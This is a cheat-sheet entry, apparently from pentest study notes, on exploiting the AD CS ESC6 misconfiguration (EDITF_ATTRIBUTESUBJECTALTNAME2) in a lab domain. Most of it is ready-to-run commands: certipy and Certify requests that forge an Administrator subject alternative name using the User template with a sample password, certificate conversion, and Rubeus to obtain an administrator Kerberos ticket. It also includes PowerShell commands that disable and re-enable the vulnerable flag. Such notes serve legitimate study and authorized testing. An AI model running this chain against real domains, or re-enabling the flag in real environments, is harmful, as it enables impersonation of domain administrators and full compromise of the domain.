# 13.09 ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2

> When CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` is set (CVE-2022-26923), any client-auth template becomes ESC1-exploitable.

## Overview

When the CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 is set, any template that allows client authentication (including the default User template) becomes exploitable like ESC1. The flag was patched in May 2022 (CVE-2022-26923) but unpatched environments remain vulnerable. Certify.exe cas reveals the flag; certipy find reports "User Specified SAN: Enabled".

## Steps

- Certipy find output shows: User Specified SAN: Enabled, ESC6 in Vulnerabilities
- Certify.exe cas shows: [!] UserSpecifiedSAN: EDITF_ATTRIBUTESUBJECTALTNAME2 set
- certutil.exe -getreg shows EditFlags value 15014e (1376590) containing EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000
- Use any client-authentication template (e.g., User) with -upn or /altname to request a cert as Administrator
- From Windows: PowerShell PSPKI CertSrvRegManagerD can read/write EditFlags value to enable or disable the flag

## Commands

### certipy req ESC6 (User template)

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template User -upn administrator@lab.local
```

### Certify.exe cas

```powershell
.\Certify.exe cas
```

### Certify.exe ESC6 request

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /altname:Administrator
```

### OpenSSL convert

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Rubeus asktgt

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx
```

### certutil query EditFlags

```powershell
certutil.exe -config "LAB-DC.lab.local\lab-LAB-DC-CA" -getreg "policy\EditFlags"
```

### PowerShell read EditFlags

```powershell
$ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "LAB-DC"; $ConfigReader.SetRootNode($true); $ConfigReader.GetConfigEntry("EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

### PowerShell disable EDITF flag

```powershell
$ConfigReader.SetConfigEntry(1114446,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

### PowerShell re-enable EDITF flag

```powershell
$ConfigReader.SetConfigEntry(1376590,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```
